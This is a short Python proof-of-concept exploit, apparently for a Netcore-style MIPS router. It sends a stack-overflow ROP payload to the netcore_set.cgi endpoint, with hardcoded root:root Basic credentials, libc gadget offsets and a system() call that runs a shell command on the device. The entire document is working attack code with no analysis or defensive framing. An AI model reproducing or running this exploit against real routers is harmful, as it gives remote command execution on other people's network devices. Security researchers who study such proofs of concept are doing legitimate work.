import requests
from pwn import *

context(arch='mips', os='linux', endian='big', word_size=32)

libc_base = 0x77f7c000
system = 0x00029250
rop1 = 0x0001D0B4
rop2 = 0x0001E148
cmd = b'ls > /usr/98765;'

url = "http://192.168.5.12/cgi-bin-igd/netcore_set.cgi"
payload = b"A"*131
payload += b"BBBB" #s0
payload += b"CCCC" #s1
payload += b"DDDD" #s2
payload += p32(libc_base+rop2) #s3
payload += p32(libc_base+system) #s4
payload += b"GGGG" #s5
payload += b"HHHH" #s6
payload += b"YYYY" #s7
payload += b"JJJJ" #s8
payload += p32(libc_base+rop1) #ra
payload += b'L'*24+cmd



data = {"mode_name": "netcore_set","config_sequence" : payload }
headers = {
    "Upgrade-Insecure-Requests": "1",
    "Connection": "keep-alive",
    "Authorization": "Basic cm9vdDpyb290",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Host": "192.168.5.12"
}

res = requests.post(url = url, headers = headers, data = data)
res = requests.post(url = url, headers = headers, data = data)
res = requests.post(url = url, headers = headers, data = data)



